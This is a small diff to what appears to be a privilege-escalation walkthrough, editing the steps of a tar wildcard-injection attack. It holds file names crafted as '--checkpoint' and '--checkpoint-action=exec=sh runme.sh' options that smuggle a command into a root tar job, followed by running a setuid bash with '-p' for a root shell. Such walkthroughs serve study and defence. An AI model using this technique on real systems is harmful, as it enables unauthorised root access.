@@ -22,9 +22,9 @@
 
 #### 2) chmod +x runme.sh
 
-#### 3) touch /tmp/--checkpoint=1
+#### 3) echo "" > --checkpoint=1
 
-#### 4) touch /tmp/--checkpoint-action=exec=sh runme.sh
+#### 4) echo "" > --checkpoint-action=exec=sh runme.sh
 
 #### 5) /tmp/bash -p
 
